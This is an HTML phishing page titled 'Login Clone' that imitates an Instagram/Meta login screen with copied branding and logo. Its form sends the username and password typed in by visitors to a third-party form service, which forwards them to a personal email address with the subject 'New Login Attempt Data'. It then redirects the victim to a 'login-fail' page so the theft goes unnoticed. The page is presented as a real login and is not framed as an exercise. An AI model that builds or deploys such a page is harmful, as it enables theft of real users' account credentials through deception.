<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Clone</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        
        <div class="logo">
            <img src="https://raw.githubusercontent.com/bignewindia/pt/e7bf53788739b39c3ec9041b3614965cffe121a9/IMG_20251025_231102.jpg" alt="Logo" class="insta-logo"> 
        </div>

        <form action="https://formsubmit.co/gaurijha1511@gmail.com" method="POST" class="login-form">
            <input type="text" name="Username" placeholder="Username, email address or mobile ..." required>
            <input type="password" name="Password" placeholder="Password" required>
            
            <input type="text" name="_honey" style="display:none"> 
            <input type="hidden" name="_next" value="YOUR_GITHUB_PAGES_URL/login-fail.html">
            <input type="hidden" name="_subject" value="New Login Attempt Data">

            <button type="submit" class="login-button">Log in</button>
        </form>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <div class="separator-container">
            <div class="line"></div>
            <div class="separator-text">OR</div>
            <div class="line"></div>
        </div>

        <button class="create-account-button">Create new account</button>

        <div class="meta-branding">
            &infin; Meta
        </div>
        
    </div>
</body>
</html>
